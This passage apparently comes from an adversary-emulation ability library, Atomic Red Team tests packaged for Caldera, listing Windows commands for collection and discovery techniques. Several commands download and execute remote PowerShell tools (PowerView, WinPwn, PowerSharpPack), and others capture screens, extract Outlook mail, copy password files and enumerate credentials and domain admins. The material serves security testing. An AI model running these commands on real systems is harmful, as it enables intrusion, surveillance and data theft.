            "name": "Clipboard Data"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item \"$env:TEMP\\atomic_T1115_clipboard_data.txt\" -ErrorAction Ignore",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Set-Clipboard -value \"Atomic T1115 Test, grab data from clipboard via VBA\"; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); Invoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1115\\src\\T1115-macrocode.txt\" -officeProduct \"Word\" -sub \"GetClipboard\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "c0a7ca5473d889ac83792ac31242ad05",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "372e6f46fca18e4f1b43209c20ffafa2": {
        "description": "[can-you-track-processes-accessing-the-camera-and-microphone](https://svch0st.medium.com/can-you-track-processes-accessing-the-camera-and-microphone-7e6885b37072)\n",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1123",
            "name": "Audio Capture"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "reg DELETE HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\C:#Windows#Temp#atomic.exe /f",
                    "command": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\C:#Windows#Temp#atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f && reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "372e6f46fca18e4f1b43209c20ffafa2",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "53d41aa7edbb10cea4c99df8c2b0862f": {
        "description": "[AudioDeviceCmdlets](https://github.com/cdhunt/WindowsAudioDevice-Powershell-Cmdlet)\n",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1123",
            "name": "Audio Capture"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "powershell.exe -Command WindowsAudioDevice-Powershell-Cmdlet",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "53d41aa7edbb10cea4c99df8c2b0862f",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "eae34104c6fbae3379fe2bb5ae8c1b15": {
        "description": "Copy from sensitive File from the c$ of another LAN computer with copy cmd\nhttps://twitter.com/SBousseaden/status/1211636381086339073",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1039",
            "name": "Data from Network Shared Drive"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del \\\\127.0.0.1\\C$\\Windows\\temp\\Easter_Bunny.password && del %TEMP%\\Easter_egg.password",
                    "command": "copy \\\\127.0.0.1\\C$\\Windows\\temp\\Easter_Bunny.password %TEMP%\\Easter_egg.password",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "eae34104c6fbae3379fe2bb5ae8c1b15",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "fbffdd20bcf00475ce05ef81dece03a8": {
        "description": "Note: Requires winzip installation\nwzzip sample.zip -s\"blueblue\" *.txt (VARIANT)\n",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1560.001",
            "name": "Archive Collected Data: Archive via Utility"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "path=%path%;\"C:\\Program Files (x86)\\winzip\" && mkdir .\\tmp\\victim-files && cd .\\tmp\\victim-files && echo \"This file will be encrypted\" > .\\encrypted_file.txt && \"%ProgramFiles%\\WinZip\\winzip64.exe\" -min -a -s\"hello\" archive.zip * && dir",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "fbffdd20bcf00475ce05ef81dece03a8",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "e80cda00a39d2947a69c109256130b30": {
        "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration.\nWhen the test completes you should find the txt files from the %USERPROFILE% directory compressed in a file called T1560.001-data.rar in the %USERPROFILE% directory \n",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1560.001",
            "name": "Archive Collected Data: Archive via Utility"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del /f /q /s %USERPROFILE%\\T1560.001-data.rar >nul 2>&1",
                    "command": "if not exist \"%programfiles%/WinRAR/Rar.exe\"  ( call ) ELSE ( echo Downloading Winrar installer && bitsadmin /transfer myDownloadJob /download /priority normal \"https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe\" %TEMP%\\winrar.exe && %TEMP%\\winrar.exe /S ) &&   &&  \"%programfiles%/WinRAR/Rar.exe\" a -r %USERPROFILE%\\T1560.001-data.rar %USERPROFILE%\\*.txt",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e80cda00a39d2947a69c109256130b30",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "6459f81c892e18b94699feb738fa4bbe": {
        "description": "Use Psr.exe binary to collect screenshots of user display. Test will do left mouse click to simulate user behaviour\n",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1113",
            "name": "Screen Capture"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "rm c:\\temp\\T1113_desktop.zip -ErrorAction Ignore",
                    "command": "cmd /c start /b psr.exe /start /output c:\\temp\\T1113_desktop.zip /sc 1 /gui 0 /stopevent 12; Add-Type -MemberDefinition '[DllImport(\"user32.dll\")] public static extern void mouse_event(int flags, int dx, int dy, int cButtons, int info);' -Name U32 -Namespace W; [W.U32]::mouse_event(0x02 -bor 0x04 -bor 0x01, 0, 0, 0, 0); cmd /c \"timeout 5 > NULL && psr.exe /stop\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "6459f81c892e18b94699feb738fa4bbe",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "54566c2f19ed9134b127d088ec2ff3a6": {
        "description": "Take a screen capture of the desktop through a call to the [Graphics.CopyFromScreen] .NET API.\n\n[Graphics.CopyFromScreen]: https://docs.microsoft.com/en-us/dotnet/api/system.drawing.graphics.copyfromscreen\n",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1113",
            "name": "Screen Capture"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item $env:TEMP\\T1113.png -ErrorAction Ignore",
                    "command": "Add-Type -AssemblyName System.Windows.Forms; $screen = [Windows.Forms.SystemInformation]::VirtualScreen; $bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height; $graphic = [Drawing.Graphics]::FromImage($bitmap); $graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size); $bitmap.Save(\"$env:TEMP\\T1113.png\")",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "54566c2f19ed9134b127d088ec2ff3a6",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "d56335095daccc74771080604a62c563": {
        "description": "Search through local Outlook installation, extract mail, compress the contents, and saves everything to a directory for later exfiltration.\nSuccessful execution will produce stdout message stating \"Please be patient, this may take some time...\". Upon completion, final output will be a mail.csv file.\n\nNote: Outlook is required, but no email account necessary to produce artifacts.\n",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1114.001",
            "name": "Email Collection: Local Email Collection"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item $env:TEMP\\mail.csv -Force -ErrorAction Ignore",
                    "command": "powershell -executionpolicy bypass -command aab4a8_Get-Inbox.ps1 -file $env:TEMP\\mail.csv",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "aab4a8_Get-Inbox.ps1"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "d56335095daccc74771080604a62c563",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "334ea9369058ceadc7b668dae1db2221": {
        "description": "Note: Requires winrar installation\nrar a -p\"blue\" hello.rar (VARIANT)\n",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1560.001",
            "name": "Archive Collected Data: Archive via Utility"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "if not exist \"%programfiles%/WinRAR/Rar.exe\"  ( call ) ELSE ( echo Downloading Winrar installer && bitsadmin /transfer myDownloadJob /download /priority normal \"https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe\" %TEMP%\\winrar.exe && %TEMP%\\winrar.exe /S ) &&   &&  mkdir .\\tmp\\victim-files && cd .\\tmp\\victim-files && echo \"This file will be encrypted\" > .\\encrypted_file.txt && \"%programfiles%/WinRAR/Rar.exe\" a -hp\"blue\" hello.rar && dir",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "334ea9369058ceadc7b668dae1db2221",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "70795de7cbb842edb029b3378c27c008": {
        "description": "Add data to clipboard to copy off or execute commands from.\n",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1115",
            "name": "Clipboard Data"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del %temp%\\T1115.txt >nul 2>&1",
                    "command": "dir | clip && echo \"T1115\" > %temp%\\T1115.txt && clip < %temp%\\T1115.txt",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "70795de7cbb842edb029b3378c27c008",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "e6dfc7e89359ac6fa6de84b0e1d5762e": {
        "description": "Utilize powershell to download discovery.bat and save to a local file. This emulates an attacker downloading data collection tools onto the host. Upon execution,\nverify that the file is saved in the temp directory.\n",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1074.001",
            "name": "Data Staged: Local Data Staging"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -Force $env:TEMP\\discovery.bat -ErrorAction Ignore",
                    "command": "Invoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat\" -OutFile $env:TEMP\\discovery.bat",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e6dfc7e89359ac6fa6de84b0e1d5762e",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "ef8a0b5dca7bf27eac2fc957810b3970": {
        "description": "Note: Requires 7zip installation\n",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1560.001",
            "name": "Archive Collected Data: Archive via Utility"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "if not exist \"%ProgramFiles%\\7-zip\\7z.exe\"  ( call ) ELSE ( echo Downloading 7-zip installer && bitsadmin /transfer myDownloadJob /download /priority normal \"https://www.7-zip.org/a/7z2002-x64.exe\" %TEMP%\\7zip.exe && %TEMP%\\7zip.exe /S ) &&   &&  mkdir $PathToAtomicsFolder\\T1560.001\\victim-files && cd $PathToAtomicsFolder\\T1560.001\\victim-files && echo \"This file will be encrypted\" > .\\encrypted_file.txt && \"%ProgramFiles%\\7-zip\\7z.exe\" u archive.7z *txt -pblue && dir",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "ef8a0b5dca7bf27eac2fc957810b3970",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "da86001b5081fcf773d8e62f22cf2b00": {
        "description": "[can-you-track-processes-accessing-the-camera-and-microphone](https://svch0st.medium.com/can-you-track-processes-accessing-the-camera-and-microphone-7e6885b37072)\n",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1125",
            "name": "Video Capture"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "reg DELETE HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\NonPackaged\\C:#Windows#Temp#atomic.exe /f",
                    "command": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\NonPackaged\\C:#Windows#Temp#atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f && reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\NonPackaged\\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "da86001b5081fcf773d8e62f22cf2b00",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "37f38e52527d57d5535adb97c7295448": {
        "description": "Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration. Upon execution, Verify that a zipped folder named Folder_to_zip.zip\nwas placed in the temp directory.\n",
        "tactic": "collection",
        "technique": {
            "attack_id": "T1074.001",
            "name": "Data Staged: Local Data Staging"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -Path $env:TEMP\\Folder_to_zip.zip -ErrorAction Ignore",
                    "command": "Compress-Archive -Path PathToAtomicsFolder\\T1074.001\\bin\\Folder_to_zip -DestinationPath $env:TEMP\\Folder_to_zip.zip -Force",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "37f38e52527d57d5535adb97c7295448",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "09da49dc99f7395aa172d0f261e365bd": {
        "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Trusts\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1482",
            "name": "Domain Trust Discovery"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "12011c_AdFind.exe -gcb -sc trustdmp",
                    "payloads": [
                        "12011c_AdFind.exe"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "09da49dc99f7395aa172d0f261e365bd",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "c75a55384a1e7026bb91f841e4ca2ba9": {
        "description": "The following Atomic test will utilize ADSISearcher to enumerate computers within Active Directory.\nUpon successful execution a listing of computers will output with their paths in AD.\nReference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1018",
            "name": "Remote System Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "([adsisearcher]\"objectcategory=computer\").FindAll(); ([adsisearcher]\"objectcategory=computer\").FindOne()",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "c75a55384a1e7026bb91f841e4ca2ba9",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "feb9647c55185e3b6045293fd26f6a5b": {
        "description": "Utilizing PowerView, run Get-ForestTrust to identify forest trusts. Upon execution, progress and info about forest trusts within the domain being scanned will be displayed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1482",
            "name": "Domain Trust Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-ForestTrust -Verbose",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "feb9647c55185e3b6045293fd26f6a5b",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "b5fe84fa9fb8216512867a039a61db20": {
        "description": "Query the registry to determine software and versions installed on the system. Upon execution a table of\nsoftware name and version information will be displayed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1518",
            "name": "Software Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize; Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "b5fe84fa9fb8216512867a039a61db20",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "f92a238fc446f89dc01f73b6c30264c3": {
        "description": "Identify System language with the chcp command.\n\nUpon successful execution, result in number format can be looked up to correlate the language.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1614.001",
            "name": "System Location Discovery: System Language Discovery"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "chcp",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f92a238fc446f89dc01f73b6c30264c3",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "e6b2a87d9100b4807c1e4d55eabeaf9c": {
        "description": "Adfind tool can be used for reconnaissance in an Active directory environment. The example chosen illustrates adfind used to query the local password policy.\nreference- http://www.joeware.net/freetools/tools/adfind/, https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1087.002",
            "name": "Account Discovery: Domain Account"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "12011c_AdFind.exe -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties",
                    "payloads": [
                        "12011c_AdFind.exe"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "e6b2a87d9100b4807c1e4d55eabeaf9c",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "413fc5fa7ac34f8a42183217d7f3ec90": {
        "description": "PowerSharpPack - Sharpup checking common Privesc vectors technique via function of WinPwn - Takes several minutes to complete.",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1082",
            "name": "System Information Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1'); Invoke-SharpUp -command \"audit\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "413fc5fa7ac34f8a42183217d7f3ec90",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "941eb886a05444e588fd6c17d992df98": {
        "description": "Search for printers / potential vulns using printercheck function of WinPwn",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1120",
            "name": "Peripheral Device Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); printercheck -noninteractive -consoleoutput",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "941eb886a05444e588fd6c17d992df98",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "a44bb43474728496276d5d73aa14588f": {
        "description": "Identify remote systems via arp. \n\nUpon successful execution, cmd.exe will execute arp to list out the arp cache. Output will be via stdout.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1018",
            "name": "Remote System Discovery"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "arp -a",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "a44bb43474728496276d5d73aa14588f",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "1ddf2b8ee6a56ce9f9132a168947653e": {
        "description": "Utilize get-wmiObject PowerShell cmdlet to identify processes.\n\nUpon successful execution, powershell.exe will execute get-wmiObject to list processes. Output will be via stdout. \n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1057",
            "name": "Process Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "get-wmiObject -class Win32_Process",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "1ddf2b8ee6a56ce9f9132a168947653e",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "9ebec3faaf3b1967542b8b7b88909e03": {
        "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Admin accounts\nreference- http://www.joeware.net/freetools/tools/adfind/, https://stealthbits.com/blog/fun-with-active-directorys-admincount-attribute/\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1087.002",
            "name": "Account Discovery: Domain Account"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "12011c_AdFind.exe -sc admincountdmp",
                    "payloads": [
                        "12011c_AdFind.exe"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "9ebec3faaf3b1967542b8b7b88909e03",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "aaeee9107989a507f526b0cef1cb274f": {
        "description": "Utilizing PowerView, run Get-DomainController to identify the Domain Controller. Upon execution, information about the domain controller within the domain will be displayed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1018",
            "name": "Remote System Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainController -verbose",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "aaeee9107989a507f526b0cef1cb274f",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "b2a1e430ca6d36eb5af2fe666e769847": {
        "description": "Utilize windows management instrumentation to identify processes.\n\nUpon successful execution, WMIC will execute process to list processes. Output will be via stdout. \n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1057",
            "name": "Process Discovery"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "wmic process get /format:list",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "b2a1e430ca6d36eb5af2fe666e769847",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "311063ce2db4fca31b5ceafa6a501dd8": {
        "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Groups\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1069.002",
            "name": "Permission Groups Discovery: Domain Groups"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "#{adfind_path} -f (objectcategory=group)",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "311063ce2db4fca31b5ceafa6a501dd8",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "6913e132cdd2d9c29294490c2fbef2eb": {
        "description": "Identify the system time via PowerShell. Upon execution, the system time will be displayed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1124",
            "name": "System Time Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Get-Date",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "6913e132cdd2d9c29294490c2fbef2eb",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "f071213a29669283eeb8ab07ddffdbfb": {
        "description": "The following Atomic test will utilize Get-AdGroup to enumerate groups within Active Directory.\nUpon successful execution a listing of groups will output with their paths in AD.\nReference: https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1069.002",
            "name": "Permission Groups Discovery: Domain Groups"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Get-AdGroup -Filter *",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f071213a29669283eeb8ab07ddffdbfb",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "d7967a23c8c030c698893f242e622be1": {
        "description": "Find or discover files on the file system. Upon execution, file and folder information will be displayed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1083",
            "name": "File and Directory Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "ls -recurse; get-childitem -recurse; gci -recurse",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "d7967a23c8c030c698893f242e622be1",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "6334877e8e3ba48f7835d4856d90a282": {
        "description": "Enumerate all accounts\nUpon execution, multiple enumeration commands will be run and their output displayed in the PowerShell session\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1087.001",
            "name": "Account Discovery: Local Account"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "net user && dir c:\\Users\\ && cmdkey.exe /list && net localgroup \"Users\" && net localgroup",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "6334877e8e3ba48f7835d4856d90a282",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "a14392d713dffba6a397682ff83259a0": {
        "description": "Get a listing of network connections.\n\nUpon successful execution, cmd.exe will execute `netstat`, `net use` and `net sessions`. Results will output via stdout.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1049",
            "name": "System Network Connections Discovery"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "netstat && net use && net sessions",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "a14392d713dffba6a397682ff83259a0",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "b8e136dad1af7b29939e86be6d7ecefa": {
        "description": "PowerSharpPack - Seatbelt technique via function of WinPwn.\n\n[Seatbelt](https://github.com/GhostPack/Seatbelt) is a C# project that performs a number of security oriented host-survey \"safety checks\" relevant from both offensive and defensive security perspectives.",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1082",
            "name": "System Information Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1'); Invoke-Seatbelt -Command \"-group=all\"; pause",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "b8e136dad1af7b29939e86be6d7ecefa",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "4712f45e41760276d20885bbc885a2ef": {
